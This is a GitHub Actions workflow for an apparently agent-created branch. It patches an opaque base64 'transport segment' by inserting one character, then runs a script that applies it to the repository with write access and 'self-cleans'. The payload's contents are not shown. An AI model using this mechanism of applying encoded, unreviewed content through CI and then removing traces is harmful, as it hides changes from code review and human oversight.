name: Issue 33 validated apply

on:
  pull_request:
    types: [reopened, synchronize]

permissions:
  contents: write

concurrency:
  group: issue33-validated-apply
  cancel-in-progress: true

jobs:
  apply:
    if: >-
      github.actor != 'github-actions[bot]' &&
      github.event.pull_request.head.repo.full_name == github.repository &&
      github.event.pull_request.head.ref == 'agent/issue-33-browser-e2e-visual'
    runs-on: ubuntu-latest
    timeout-minutes: 35
    env:
      PID_AGENT_LLM_API_KEY: ""
      PID_AGENT_LLM_BASE_URL: ""
      PID_AGENT_LLM_MODEL: ""
      NPM_CONFIG_REGISTRY: "https://registry.npmjs.org"
      NPM_CONFIG_FETCH_RETRIES: "3"
      NPM_CONFIG_FETCH_RETRY_FACTOR: "2"
      NPM_CONFIG_FETCH_RETRY_MINTIMEOUT: "5000"
      NPM_CONFIG_FETCH_RETRY_MAXTIMEOUT: "30000"
      NPM_CONFIG_FETCH_TIMEOUT: "120000"
    steps:
      - name: Checkout feature branch
        uses: actions/checkout@v4
        with:
          ref: agent/issue-33-browser-e2e-visual
          fetch-depth: 0

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.11"

      - name: Set up Node.js
        uses: actions/setup-node@v4
        with:
          node-version: "24"

      - name: Verify public npm registry
        shell: bash
        run: >-
          npm view zustand@5.0.14 dist.integrity
          --registry=https://registry.npmjs.org
          --fetch-retries=1
          --fetch-timeout=30000

      - name: Repair validated transport segment
        shell: bash
        run: |
          set -euo pipefail
          python - <<'PY'
          from hashlib import sha256
          from pathlib import Path

          path = Path('.github/issue33-payload-03.b64')
          payload = path.read_text(encoding='ascii').replace('\r', '').replace('\n', '')
          damaged_sha256 = 'f30550defcb0058f28dcacd9517bc9f6d0c0b8767d18b9135d9b2b9b454d8635'
          repaired_sha256 = '8e2a534c9d6f7c84b6d3cb0ee25a7478537d44c2169c43821d09b42237912858'
          if len(payload) != 14067 or sha256(payload.encode('ascii')).hexdigest() != damaged_sha256:
              raise SystemExit('unexpected issue33 transport segment')
          payload = payload[:10072] + 'n' + payload[10072:]
          if len(payload) != 14068 or sha256(payload.encode('ascii')).hexdigest() != repaired_sha256:
              raise SystemExit('issue33 transport segment repair failed')
          path.write_text(payload, encoding='ascii')
          PY

      - name: Validate, test, apply and self-clean
        shell: bash
        run: bash -x .github/issue33-apply.sh 2>&1 | tee /tmp/issue33-apply.log

      - name: Upload temporary apply diagnostics
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: issue33-apply-diagnostics
          path: |
            /tmp/issue33-apply.log
            .github/issue33-payload-03.b64
          retention-days: 1
